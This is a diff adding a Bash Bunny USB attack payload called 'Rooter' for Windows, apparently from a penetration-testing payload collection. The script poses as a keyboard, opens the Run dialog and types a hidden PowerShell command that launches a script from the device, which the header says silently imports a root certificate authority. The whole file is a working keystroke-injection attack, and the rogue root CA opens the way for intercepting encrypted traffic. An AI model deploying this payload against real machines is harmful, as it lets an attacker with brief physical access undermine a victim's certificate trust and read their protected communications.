@@ -1,0 +1,21 @@
+#!/bin/bash
+#
+# Title:         Rooter
+# Author:        JRSmile
+# Version:       0.1
+# Target:        Windows XP SP3+
+# Props:         Hak5Darren/HAK5
+#
+# Executes a hidden powershell script that imports a root CA
+#
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\dummy.ps1')"
+QUACK ENTER
+LED G
